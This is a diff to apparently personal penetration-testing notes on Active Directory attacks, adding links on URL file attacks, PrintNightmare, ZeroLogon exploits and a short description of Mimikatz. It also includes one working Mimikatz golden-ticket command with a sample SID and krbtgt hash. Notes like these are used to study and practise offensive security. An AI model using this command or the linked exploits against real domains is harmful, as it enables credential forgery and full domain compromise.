@@ -79,10 +79,53 @@ https://medium.com/@Shorty420/kerberoasting-9108477279cc
 
 https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/
 
+-------
+
 ### URL File Attacks
 
 - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#scf-and-url-file-attack-against-writeable-share
 
+-------
+
+**PrintNightmare**
+- https://github.com/cube0x0/CVE-2021-1675#scanning
+- https://github.com/calebstewart/CVE-2021-1675
+
+-----
+
+### Mimikatz
+
+#### What is Mimikatz?:
+- Tool used to view and steal credentials, generate Kerberos tickets, and leverage attacks
+- Dumps credentials stored in memory.
+- Credential Dumping,  Pass-the-Hash, Over-Pass-the-Hash, Pass-the-Ticket, Golden Ticket, Silver Ticket
+
+https://github.com/gentilkiwi/mimikatz/wiki
+
+-----
+
+### Golden Ticket Attacks
+
+```
+mimikatz# kerberos::golden /User:Administratorfake123 /domain:Marvel.local /sid:s-1-5-21-3e1214212-392ø777931-1277971883 /krbtgt:11f843aafd22acfb29aef92f6e423994 /id:500 /ptt
+```
+
+-----
+
+### Abusing ZeroLogon
+
+What is ZeroLogon? - https://www.trendmicro.com/en_us/what-is/zerologon.html
+
+dirkjanm CVE-2020-1472 - https://github.com/dirkjanm/CVE-2020-1472
+
+SecuraBV ZeroLogon Checker - https://github.com/SecuraBV/CVE-2020-1472
+
+
+-----
+
+Active Directory Security Blog: https://adsecurity.org/
+
+Harmj0y Blog: http://blog.harmj0y.net/
 
 
 
